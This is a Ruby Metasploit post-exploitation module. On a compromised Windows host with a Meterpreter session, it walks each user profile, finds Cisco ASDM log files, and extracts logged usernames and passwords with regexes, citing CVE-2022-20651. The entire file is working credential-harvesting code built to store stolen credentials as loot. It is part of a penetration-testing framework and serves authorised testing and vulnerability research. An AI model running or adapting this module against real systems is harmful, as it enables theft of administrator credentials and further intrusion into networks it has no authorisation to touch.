# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat
  ARTIFACTS =
    {
      application: 'asdm',
      app_category: 'administration',
      gatherable_artifacts: [
        {
          filetypes: 'log_files',
          path: 'ProfileDir',
          dir: '.asdm',
          artifact_file_name: 'asdm-idm-log-*.txt',
          description: 'Cisco ASDM logged credentials',
          credential_type: 'text',
          regex_search: [
            {
              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',
              extraction_type: 'credentials',
              regex: [
                '(?i-mx:password="[^"]+")',
                '(?i-mx:username="[^"]+")',
                '(?i-mx:Logged in username:.*)'
              ]
            }
          ]
        }
      ]
    }.freeze
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco ASDM Log File Information Disclosure',
        'Description' => %q{
          This module uses the PackRat post-exploitation library to find Cisco ASDM log files on
          Windows and then parse the files for logged credentials. In some situations, saved usernames
          are logged initentionally, but ASDM also logged passwords in some situations
          for ASDM 7.17.1 and below (see CVE-2022-20651).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'jbaines-r7'
        ],
        'References' => [
          ['CVE', '2022-20651'],
          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asdm-logging-jnLOY422']
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [
          false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map do |k|
                                                          k[:filetypes]
                                                        end.uniq.unshift('All')
        ])
      ]
    )
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, ARTIFACTS)
    end

    print_status 'PackRat credential sweep Completed'
  end
end
